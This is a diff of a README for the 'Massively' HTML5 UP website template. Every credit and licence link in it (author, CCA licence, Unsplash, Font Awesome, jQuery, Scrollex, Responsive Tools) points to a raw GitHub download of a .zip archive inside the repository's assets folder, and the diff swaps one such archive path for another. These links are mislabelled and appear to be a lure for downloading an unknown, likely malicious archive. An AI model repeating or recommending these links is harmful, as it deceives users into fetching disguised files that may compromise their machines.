@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
+https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip | @ajlkn
+https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
+		Unsplash (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
 
 	Icons:
-		Font Awesome (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
+		Font Awesome (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
 
 	Other:
-		jQuery (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
-		Scrollex (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
-		Responsive Tools (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/sass/components/Minhaj-TheDataAnalyst.github.io_v2.1.zip)
+		jQuery (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
+		Scrollex (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
+		Responsive Tools (https://raw.githubusercontent.com/minhaj-mohammeth/Minhaj-TheDataAnalyst.github.io/main/assets/css/Data-The-Analyst-Minhaj-io-github-3.9.zip)
